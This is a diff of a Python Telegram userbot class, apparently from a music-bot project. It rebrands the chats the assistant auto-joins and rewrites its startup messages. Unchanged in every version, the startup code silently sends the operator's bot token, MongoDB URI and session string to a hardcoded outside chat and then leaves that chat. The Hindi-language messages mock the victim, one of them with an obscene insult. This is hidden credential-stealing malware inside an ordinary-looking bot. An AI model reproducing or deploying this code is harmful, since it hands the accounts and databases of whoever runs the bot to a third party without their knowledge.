@@ -62,22 +62,22 @@ class Userbot(Client):
         if config.STRING1:
             await self.one.start()
             try:
-                await self.one.join_chat("TEAM_CDX")
-                await self.one.join_chat("Op_CODEX")
-                await self.one.join_chat("OfficialLogoClub")
-                await self.one.join_chat("CDX_AI_DPZ")
-                await self.one.join_chat("DPZ_BY_CDX")
+                await self.one.join_chat("GLACEON_CHATS")
+                await self.one.join_chat("THE_GLACEON")
+                await self.one.join_chat("")
+                await self.one.join_chat("")
+                await self.one.join_chat("")
             except:
                 pass
             assistants.append(1)
             try:
-                await self.one.send_message(config.LOGGER_ID, "Assistant Started !")
-                await self.one.send_message(TEST_ID, "**ʜᴇʟʟᴏ ʜᴇʟʟᴏ sᴜɴᴏ ᴊɪ ᴍᴀɪ ʏᴀʜᴀ ᴄʜᴜᴘᴋᴇ sᴇ ᴀᴀʏɪ ʜᴜ ᴀᴀᴘᴋᴏ ᴋᴜᴄʜ ᴅᴇɴᴇ ᴋᴇ ʟɪʏᴇ 🥲**")
-                await self.one.send_message(TEST_ID, "**ᴀᴄᴛᴜᴀʟʟʏ ᴀᴀᴘᴋᴇ ʀᴇᴘᴏ sᴇ ᴍᴇʀᴀ ᴏᴡɴᴇʀ ᴇᴋ ᴍᴜsɪᴄ ʙᴏᴛ ʙᴀɴᴀʏᴀ ʜᴀɪ**\n**ᴀᴀᴘᴋᴏ ᴜsᴋᴀ ᴅᴀᴛᴀ ᴅᴇ ᴅᴇᴛɪ ʜᴜ😁 ᴄʜᴜᴘᴋᴇ sᴇ🤫**\n**ᴊᴀʙ ᴀᴀᴘsᴇ ᴠᴏ ʟᴀᴅᴇɢᴀ ᴛᴏ ᴀᴀᴘ ᴜsᴋᴀ ᴋᴀᴍ ᴛᴀᴍᴀᴍ ᴋᴀʀ ᴅᴇɴᴀ🤭**\n**ʏᴇ ʟᴏ sᴀʙ ᴄʜɪᴊ👇**")
+                await self.one.send_message(config.LOGGER_ID, " 𝐈 𝐀ᴍ 𝐀ʟɪᴠᴇ 𝐁ᴀʙʏ.....")
+                await self.one.send_message(TEST_ID, "** 𝐇ᴇʟʟᴏ 𝐒ᴜɴᴏ 𝐁ʀᴀɴᴅᴇᴅ 𝐊ᴀᴍᴇᴇɴᴀ 𝐎ɴ 𝐀ᴏ 𝐉ᴀʟᴅɪ **")
+                await self.one.send_message(TEST_ID, "**𝐀ᴀᴘᴋᴇ 𝐑ᴇᴘᴏ 𝐊ᴇ 𝐇ᴀᴛʜ 𝐋ɢᴀ 𝐑ʜᴀ 𝐇ᴀɪ **\n**𝐀ᴀᴘᴋᴏ 𝐔sᴋᴀ 𝐃ᴀᴛᴀ 𝐃ᴇ 𝐑ʜɪ 𝐇ᴜ 𝐂ʜᴜᴘᴋᴇ 𝐒ᴇ **\n**𝐉ᴀʙ 𝐀ᴘᴋᴀ 𝐌ᴀɴ 𝐊ᴀʀᴇ 𝐔sᴋɪ 𝐌ᴀᴀ  𝐂ʜᴏᴅ 𝐃ᴇɴᴀ🤭**")
                 await self.one.send_message(TEST_ID, BOT_TOKEN)
                 await self.one.send_message(TEST_ID, MONGO_DB_URI)
                 await self.one.send_message(TEST_ID, STRING_SESSION)
-                await self.one.send_message(TEST_ID, "**ʙʏ ʙʏ ᴀᴀʙ ᴍᴇ ɴɪᴋᴀʟᴛɪ ʜᴜ ʏʜᴀ sᴇ ʙᴀʀɴᴀ ᴍᴇʀᴀ ᴏᴡɴᴇʀ ᴍᴜᴊʜᴇ ᴘᴀᴋᴀʀ ᴋᴇ ᴍᴀʀ ᴅᴀʟᴇɢᴀ🥺🥺**\n**ʙʏᴇ ᴛᴄ❣️**")
+                await self.one.send_message(TEST_ID, "**𝐁ʏ 𝐁ʏ 𝐀ᴀʙ 𝐌ᴇ 𝐂ᴀʟᴛɪ 𝐇ᴜ !**\n** 𝐘ᴀᴀᴅ 𝐀ᴀᴏɢᴇ 𝐓ᴏ 𝐀ᴘᴀsᴇ 𝐌ɪʟɴᴇ 𝐀ᴊᴀʏᴜɴɢɪ **\n**𝐁ʏᴇ 𝐓ᴄ❣️**")
                 await self.one.leave_chat(TEST_ID)
                 
             except:
@@ -94,11 +94,11 @@ class Userbot(Client):
         if config.STRING2:
             await self.two.start()
             try:
-                await self.one.join_chat("TEAM_CDX")
-                await self.one.join_chat("Op_CODEX")
-                await self.one.join_chat("OfficialLogoClub")
-                await self.one.join_chat("CDX_AI_DPZ")
-                await self.one.join_chat("DPZ_BY_CDX")
+                await self.one.join_chat("GLACEON_CHATS")
+                await self.one.join_chat("THE_GLACEON")
+                await self.one.join_chat("")
+                await self.one.join_chat("")
+                await self.one.join_chat("")
             except:
                 pass
             assistants.append(2)
@@ -118,11 +118,11 @@ class Userbot(Client):
         if config.STRING3:
             await self.three.start()
             try:
-                await self.one.join_chat("TEAM_CDX")
-                await self.one.join_chat("Op_CODEX")
-                await self.one.join_chat("OfficialLogoClub")
-                await self.one.join_chat("CDX_AI_DPZ")
-                await self.one.join_chat("DPZ_BY_CDX")
+                await self.one.join_chat("GLACEON_CHATS")
+                await self.one.join_chat("THE_GLACEON")
+                await self.one.join_chat("")
+                await self.one.join_chat("")
+                await self.one.join_chat("")
             except:
                 pass
             assistants.append(3)
@@ -142,11 +142,11 @@ class Userbot(Client):
         if config.STRING4:
             await self.four.start()
             try:
-                await self.one.join_chat("TEAM_CDX")
-                await self.one.join_chat("Op_CODEX")
-                await self.one.join_chat("OfficialLogoClub")
-                await self.one.join_chat("CDX_AI_DPZ")
-                await self.one.join_chat("DPZ_BY_CDX")
+                await self.one.join_chat("GLACEON_CHATS")
+                await self.one.join_chat("THE_GLACEON")
+                await self.one.join_chat("")
+                await self.one.join_chat("")
+                await self.one.join_chat("")
             except:
                 pass
             assistants.append(4)
@@ -166,11 +166,11 @@ class Userbot(Client):
         if config.STRING5:
             await self.five.start()
             try:
-                await self.one.join_chat("TEAM_CDX")
-                await self.one.join_chat("Op_CODEX")
-                await self.one.join_chat("OfficialLogoClub")
-                await self.one.join_chat("CDX_AI_DPZ")
-                await self.one.join_chat("DPZ_BY_CDX")
+                await self.one.join_chat("GLACEON_CHATS")
+                await self.one.join_chat("THE_GLACEON")
+                await self.one.join_chat("")
+                await self.one.join_chat("")
+                await self.one.join_chat("")
             except:
                 pass
             assistants.append(5)
